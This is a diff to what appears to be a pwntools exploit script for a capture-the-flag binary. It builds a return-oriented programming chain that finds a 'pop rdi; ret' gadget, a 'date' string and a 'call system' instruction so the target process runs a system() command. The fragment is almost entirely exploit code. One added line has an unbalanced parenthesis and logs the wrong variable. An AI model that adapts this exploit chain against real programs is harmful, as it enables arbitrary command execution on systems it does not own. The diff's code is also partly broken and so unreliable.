@@ -24,13 +24,14 @@ execute_string = next(elf.search(b'date'))
 info("%#x execute string", execute_string)
 execute_string = p64(next(elf.search(b'date')))
 
+call_system = next(elf.search(asm('call system'), executable = True)))
+info("%#x execute string", execute_string)
+call_system = p64(call_system)
+
 rop = ROP(elf)
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
 info("%#x POP RDI", POP_RDI)
 POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
-
-system_call = (rop.find_gadget(['call system']))[0]
-info("%#x call system", system_call)
 
 log.info('Create IO')
 #io = remote('', )
